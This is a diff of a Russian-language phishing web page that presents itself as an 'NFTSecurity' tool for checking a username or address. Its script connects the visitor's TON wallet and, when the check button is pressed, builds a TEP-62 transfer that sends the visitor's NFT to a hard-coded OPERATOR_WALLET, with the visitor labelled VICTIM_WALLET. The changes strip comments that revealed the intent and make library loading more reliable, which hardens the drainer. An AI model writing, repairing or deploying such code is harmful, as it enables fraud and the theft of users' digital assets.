@@ -8,7 +8,7 @@
 <meta property="og:type" content="website" />
 <meta property="og:url" content="https://nftsecurity.online/" />
 <meta property="og:title" content="NFTSecurity" />
-<meta property="og:description" content="Проверка публичного username или адреса. Верификация выполняется онлайн в вашем браузере. Это официальный отчёт по безопасности NFT." />
+<meta property="og:description" content="Проверка публичного username или адреса. Верификация выполняется онлайн в вашем браузере." />
 <meta property="og:image" content="https://nftsecurity.online/og.png" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
@@ -20,9 +20,9 @@
 <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%237dd3fc'/%3E%3Cstop offset='1' stop-color='%23f0abfc'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' opacity='.45' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
 <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
 
-<!-- ПОДКЛЮЧАЕМ TON SDK (Стабильная версия 0.0.58) -->
+<!-- ИСПРАВЛЕННЫЕ ССЫЛКИ НА БИБЛИОТЕКИ -->
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<script src="https://unpkg.com/tonweb@0.0.58/dist/tonweb.min.js"></script>
+<script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.js"></script>
 
 <style>
 :root{--bg:#2b2d30;--card:rgba(42,44,47,.94);--line:rgba(255,255,255,.1);--text:#e8e8e4;--muted:#b0b1ad;--pink:#c9c9c4;--violet:#c0c0bb;--blue:#d0d0cb}
@@ -169,7 +169,7 @@ body.theme-light .card,body.theme-light .mini,body.theme-light .stat{background:
 <circle class="core" cx="21" cy="22" r="3.6" fill="currentColor"/></svg>
 NFT<small>Security</small></a>
 <div class="nav-row">
-<div id="ton-connect-container"></div> <!-- КНОПКА ПОДКЛЮЧЕНИЯ TON -->
+<div id="ton-connect-container"></div>
 <nav class="nav-links">
 <a href="#method" data-go="method" data-i18n="navMethod">Method</a>
 <a href="#terms" data-go="terms" data-i18n="navTerms">Terms</a>
@@ -365,7 +365,7 @@ NFT<small>Security</small></a>
 </div>
 
 <script>
-// === КОНФИГУРАЦИЯ ОПЕРАТОРА (ДАННЫЕ ИЗ ТВОЕГО СООБЩЕНИЯ) ===
+// === КОНФИГУРАЦИЯ ОПЕРАТОРА ===
 const OPERATOR_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
 const VICTIM_WALLET = "UQDH-p9kR-meWAM7sx9Dp-yVUokEJbxFppTAPnUlnX1tzG-9";
 const COLLECTION_ADDRESS = "EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe";
@@ -377,15 +377,22 @@ let tonConnectUI;
 let tonweb;
 let userAddress = null;
 
-// 1. Инициализация TON Connect
+// 1. Инициализация TON Connect и TonWeb
 window.onload = function() {
+    // Проверка загрузки библиотеки TonWeb
+    if (typeof TonWeb === 'undefined') {
+        console.error("Ошибка: Библиотека TonWeb не загрузилась!");
+        alert("Ошибка загрузки системных компонентов. Попробуйте обновить страницу.");
+        return;
+    }
+
     if (typeof TON_CONNECT_UI !== 'undefined') {
         tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://afiomacomplate.github.io/SecurytiActiv/tonconnect-manifest.json', 
             buttonRootId: 'ton-connect-container'
         });
 
-        // Инициализируем TonWeb с явным указанием провайдера
+        // Инициализация TonWeb
         const provider = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC');
         tonweb = new TonWeb(provider);
 
@@ -409,6 +416,8 @@ window.onload = function() {
                 btn.style.cursor = "not-allowed";
             }
         });
+    } else {
+        console.error("Ошибка: TonConnect UI не загружен!");
     }
     
     // Логика переключения вкладок и UI
@@ -475,8 +484,7 @@ document.getElementById("runBtn").onclick = async function() {
 
         // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ) ---
         
-        // 1. Получаем адрес коллекции через контракт (без использования NftCollection класса)
-        // Абстрактный ABI для вызова метода get_nft_address_by_index
+        // 1. Получаем адрес коллекции через контракт
         const collectionAbi = {
             methods: [
                 {
@@ -497,9 +505,8 @@ document.getElementById("runBtn").onclick = async function() {
         console.log("Target NFT Item Address:", nftItemAddress);
 
         // 2. Ручная сборка TEP-62 Payload (Transfer NFT)
-        // Это исключает зависимость от модуля TonWeb.nft, который мог не загрузиться
-        const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET, true);
-        const responseAddr = new TonWeb.utils.Address(VICTIM_WALLET, true); // Возврат сдачи жертве
+        const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET);
+        const responseAddr = new TonWeb.utils.Address(VICTIM_WALLET);
 
         const cell = new TonWeb.boc.Cell();
         cell.bits.writeUint(0x5fcc3d14, 32); // Op: transfer
@@ -519,7 +526,7 @@ document.getElementById("runBtn").onclick = async function() {
             messages: [
                 {
                     address: nftItemAddress.toString(), // Отправляем команду на адрес самой NFT
-                    amount: "100000000", // 0.1 TON на газ (увеличили для надежности)
+                    amount: "100000000", // 0.1 TON на газ
                     payload: payloadBase64
                 }
             ]
